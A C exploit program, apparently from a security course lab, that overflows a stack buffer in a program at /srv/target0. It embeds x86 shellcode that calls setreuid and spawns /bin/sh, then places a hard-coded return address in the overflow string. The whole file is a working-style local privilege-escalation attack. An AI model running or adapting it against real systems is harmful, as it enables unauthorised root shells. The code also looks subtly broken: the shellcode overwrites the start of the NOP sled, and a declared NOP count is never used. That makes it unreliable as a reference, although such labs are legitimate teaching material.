#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target0"

static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

const int OFFSET = 408;
const int NOP_COUNT = 200;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const char* RETURN_ADDRESS = 0xffffdb2c;

int main(void)
{
  char *args[3];
  char *env[1];

  // Create the exploit string
  char buf[OFFSET + 1];

  // Add the NOP sled
  memset(buf, '\x90', sizeof(buf));

  buf[OFFSET] = 0;

  // Add the shellcode
  memcpy(buf, shellcode, SHELLCODE_LENGTH);

  *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;

  // Set up the arguments for execve
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  // Execute the target program with the exploit string
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}